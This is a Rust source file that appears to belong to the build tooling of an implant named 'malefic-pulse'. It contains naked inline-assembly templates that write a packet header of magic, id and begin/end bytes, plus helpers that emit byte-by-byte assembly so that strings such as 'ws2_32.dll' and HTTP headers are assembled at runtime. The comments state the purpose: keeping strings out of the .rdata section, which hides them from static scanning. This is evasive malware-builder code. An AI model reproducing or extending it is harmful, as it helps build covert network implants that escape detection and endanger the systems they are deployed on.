
pub(crate) static X86_MAIN_TEMPLATE_PATH: &str = 
    "malefic-pulse/src/template/x86_common_template";
pub(crate) static X64_MAIN_TEMPLATE_PATH: &str = 
    "malefic-pulse/src/template/x64_common_template";
pub(crate) static TARGET_SOURCE_PATH: &str = "malefic-pulse/src/main.rs";

pub(crate) static X64_MAKE_BODY : &str = r#"
#[naked]
unsafe extern "C" fn make_body(
    buf: *mut u8,
    begin: u8,
    end: u8,
    magic: u32,
    id: u32
) {
    core::arch::asm!(
        "mov BYTE PTR[rcx], dl",
        "mov DWORD PTR[rcx +1], r9d",
        "mov eax, DWORD PTR[rsp + 0x28]",
        "mov DWORD PTR[rcx +5], eax",
        "mov BYTE PTR[rcx + 9], r8b",
        "ret",
        options(noreturn)
    )
}
"#;

pub(crate) static X86_MAKE_BODY: &str = r#"
#[naked]
unsafe extern "C" fn make_body(
    buf: *mut u8,
    begin: u8,
    end: u8,
    magic: u32,
    id: u32
) {
    core::arch::asm!(
        "push ebp",
        "mov  ebp, esp",
        "push ecx",

        "mov eax, [ebp + 0x8]",
        "mov cl, BYTE PTR[ebp + 0xc]",
        "mov BYTE PTR[eax], cl",
        "mov cl, BYTE PTR[ebp + 0x10]", //end
        "mov BYTE PTR[eax + 9], cl",
        "mov ecx, DWORD PTR[ebp + 0x14]", // magic
        "mov DWORD PTR[eax + 1], ecx",
        "xor ecx, ecx",
        "mov ecx, [ebp + 0x18]", // id
        "mov [eax + 5], ecx",

        "pop ecx",
        "mov esp, ebp",
        "pop ebp",
        "ret",
        options(noreturn)
    )
}
"#;

/// Generate inline assembly instructions to construct a string at runtime
/// This prevents the compiler from optimizing strings into .rdata section
pub(crate) fn generate_string_asm_instructions(s: &str, reg_name: &str) -> String {
    let mut instructions = Vec::new();
    for (i, byte) in s.bytes().enumerate() {
        instructions.push(format!(
            "\"mov BYTE PTR [{{{}}} + {}], {}\",",
            reg_name, i, byte
        ));
    }
    instructions.join("\n            ")
}

/// Generate assembly instructions for "ws2_32.dll\0"
pub(crate) fn generate_dll_name_asm() -> String {
    r#""mov BYTE PTR [{dll} + 0], 119",   // 'w'
            "mov BYTE PTR [{dll} + 1], 115",   // 's'
            "mov BYTE PTR [{dll} + 2], 50",    // '2'
            "mov BYTE PTR [{dll} + 3], 95",    // '_'
            "mov BYTE PTR [{dll} + 4], 51",    // '3'
            "mov BYTE PTR [{dll} + 5], 50",    // '2'
            "mov BYTE PTR [{dll} + 6], 46",    // '.'
            "mov BYTE PTR [{dll} + 7], 100",   // 'd'
            "mov BYTE PTR [{dll} + 8], 108",   // 'l'
            "mov BYTE PTR [{dll} + 9], 108",   // 'l'
            "mov BYTE PTR [{dll} + 10], 0","#.to_string()
}

/// Generate assembly instructions for HTTP header construction
/// This creates position-independent code by using inline assembly

#[allow(dead_code)]
pub(crate) fn generate_header_asm_instructions(header: &str, reg_name: &str) -> String {
    let mut instructions = Vec::new();
    for (i, byte) in header.bytes().enumerate() {
        instructions.push(format!(
            "\"mov BYTE PTR [{{{}}} + {}], {}\",",
            reg_name, i, byte
        ));
    }
    instructions.join("\n            ")
}